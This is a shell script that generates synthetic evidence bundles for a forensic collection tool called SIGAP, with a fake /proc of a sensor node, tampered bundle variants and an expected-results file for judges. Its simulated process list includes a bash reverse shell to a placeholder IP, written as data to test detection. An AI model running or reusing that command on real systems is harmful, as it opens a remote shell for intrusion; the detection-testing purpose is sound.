#!/bin/sh
# Membuat contoh bundle SIGAP untuk kit juri dan situs coba online:
#   sh scripts/make-samples.sh <folder>
#     <folder>/trust_store.json   kunci publik node sensor-01 (berlaku 2 tahun)
#     <folder>/bundle/*.zip       1 bundle asli + 9 manipulasi
#     <folder>/bundle/harapan.txt status yang benar untuk tiap bundle
#
# Isi bundle sepenuhnya sintetis (/proc tiruan sebuah node sensor), bukan data mesin
# build. Kunci privat dibuat di direktori sementara lalu dibuang.
set -eu
cd "$(dirname "$0")/.."
DEST=${1:?pemakaian: sh scripts/make-samples.sh <folder>}
mkdir -p "$DEST/bundle"
WORK=$(mktemp -d "${TMPDIR:-/tmp}/sigap-demo.XXXXXX")
trap 'rm -rf "$WORK"' EXIT

SIGAP=$WORK/sigap
CGO_ENABLED=0 go build -trimpath -o "$SIGAP" ./cmd/sigap

# /proc tiruan: node sensor IoMT yang sedang menjalankan reverse shell simulasi.
P=$WORK/proc
proc() { # pid ppid comm exe cmdline...
  pid=$1 ppid=$2 comm=$3 exe=$4; shift 4
  mkdir -p "$P/$pid"
  printf '%s\n' "$comm" > "$P/$pid/comm"
  printf '%s\0' "$@" > "$P/$pid/cmdline"
  printf '%s (%s) S %s %s %s 0 -1 4194560\n' "$pid" "$comm" "$ppid" "$pid" "$pid" > "$P/$pid/stat"
  ln -s "$exe" "$P/$pid/exe"
}
proc 1   0   init      /sbin/init                 /sbin/init
proc 214 1   dropbear  /usr/sbin/dropbear         /usr/sbin/dropbear -F -R -p 22
proc 388 1   mosquitto /usr/sbin/mosquitto        /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
proc 412 1   python3   /usr/bin/python3.11        python3 /opt/sensor/telemetry.py --conf /etc/sensor/sensor.conf
proc 587 1   sigap     /usr/local/bin/sigap       /usr/local/bin/sigap agent --config /etc/sigap/agent.json
proc 913 412 sh        /bin/dash                  sh -c "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"
mkdir -p "$P/net" "$P/sys/kernel"
hdr='  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode'
{
  echo "$hdr"
  echo '   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11201 1'
  echo '   1: 0100007F:075B 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11342 1'
  echo '   2: 157100CB:A23C 0A7100CB:1F40 01 00000000:00000000 00:00000000 00000000     0        0 12007 1'
  echo '   3: 157100CB:992A 327100CB:115C 01 00000000:00000000 00:00000000 00000000     0        0 12951 1'
} > "$P/net/tcp"
echo "$hdr" > "$P/net/tcp6"
echo "6.1.0-sigap-demo" > "$P/sys/kernel/osrelease"
echo "86412.37 171903.12" > "$P/uptime"

node() { # name trust-store-or-empty
  d=$WORK/$1
  mkdir -p "$d/outbox"
  i=0; while [ $i -lt 40 ]; do echo "2026-11-05T08:00:$((i % 60)) telemetry ok temp=41.2C batt=87%"; i=$((i + 1)); done > "$d/sensor.log"
  printf 'mode=patrol\nmqtt_host=127.0.0.1\napi_key=demo-secret-123\n' > "$d/sensor.conf"
  if [ -n "$2" ]; then
    "$SIGAP" keygen --key-id "node-$1-demo" --out "$d/node.key" --trust "$2" --valid-days 730 >/dev/null
  else
    "$SIGAP" keygen --key-id "node-$1-demo" --out "$d/node.key" --valid-days 730 >/dev/null
  fi
  cat > "$d/agent.json" <<EOF
{"node_id": "$1", "proc_root": "$P", "key_file": "$d/node.key", "outbox": "$d/outbox",
 "log_files": ["$d/sensor.log"], "config_files": ["$d/sensor.conf"]}
EOF
  "$SIGAP" collect --config "$d/agent.json" --trigger "rule: reverse_shell_pattern" 2>/dev/null
  ls "$d/outbox"/*.zip | head -1
}
cp "$(node sensor-01 "$DEST/trust_store.json")" "$DEST/bundle/00_asli.zip"
# Ditandatangani kunci Ed25519 yang sah tetapi tidak pernah didaftarkan di trust store.
cp "$(node sensor-asing "")" "$DEST/bundle/06_kunci_asing.zip"
python3 tools/make_tampered.py "$DEST/bundle/00_asli.zip" "$DEST/bundle" >/dev/null
chmod 0644 "$DEST"/bundle/*.zip
python3 - "$DEST/bundle/harapan.txt" <<'EOF'
import sys
from tools.make_tampered import VARIANTS
rows = {"00_asli.zip": "VALID", "06_kunci_asing.zip": "UNTRUSTED_SIGNER"}
rows.update({f"{name}.zip": expected for name, (_, expected) in VARIANTS.items()})
with open(sys.argv[1], "w", newline="\n") as f:
    for name in sorted(rows):
        f.write(f"{name} {rows[name]}\n")
EOF
